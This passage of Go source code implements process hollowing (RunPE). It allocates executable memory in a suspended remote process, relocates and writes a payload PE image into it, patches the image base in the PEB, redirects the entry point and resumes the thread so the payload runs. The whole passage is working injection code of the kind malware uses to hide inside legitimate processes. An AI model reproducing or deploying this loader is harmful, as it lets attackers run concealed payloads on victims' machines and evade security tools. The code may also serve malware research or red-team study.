	}
	log.Printf(
		"Size of uint32: %d size of uintptr: %d\n", uint64(unsafe.Sizeof(*new(uint32))),
		uint64(unsafe.Sizeof(*new(uintptr))))
	//4. Write the payload's ImageBase into remote process' PEB:
	err := WriteProcessMemory(
		pi.Process, remoteImgBase, uintptr(unsafe.Pointer(&loadBase)), imgBaseSize)
	if err != nil {
		log.Println("Error WriteProcessMemory: ", err.Error())
		return false
	}
	return true
}

//gRunPE2 func
func gRunPE2(
	loadedPE uintptr, payloadImageSize uint64, pi *syscall.ProcessInformation, is32bit bool,
) bool {
	if loadedPE == 0 {
		return false
	}

	//1. Allocate memory for the payload in the remote process:
	remoteBase, err := VirtualAllocEx(
		pi.Process, 0, payloadImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		log.Println("Error VirtualAllocEx: ", err.Error())
		return false
	}
	log.Printf("Allocated remote ImageBase: %X size: %d\n", remoteBase, payloadImageSize)

	//2. Relocate the payload (local copy) to the Remote Base:
	if !gRelocateModule(loadedPE, payloadImageSize, remoteBase, 0) {
		log.Println("Could not relocate the module!")
		return false
	}
	//3. Update the image base of the payload (local copy) to the Remote Base:
	UpdateImageBase(loadedPE, remoteBase)

	log.Println("Writing to remote process...")
	//4. Write the payload to the remote process, at the Remote Base:
	err = WriteProcessMemory(
		pi.Process, remoteBase, loadedPE, payloadImageSize)
	if err != nil {
		log.Println("Error WriteProcessMemory: ", err.Error())
		return false
	}
	log.Printf("Loaded at: %#x\n", loadedPE)
	//5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
	if !gRedirectToPayload(loadedPE, remoteBase, pi, is32bit) {
		log.Println("Redirecting failed!")
		return false
	}

	//6. Resume the thread and let the payload run:
	ResumeThread(pi.Thread)
	return true
}
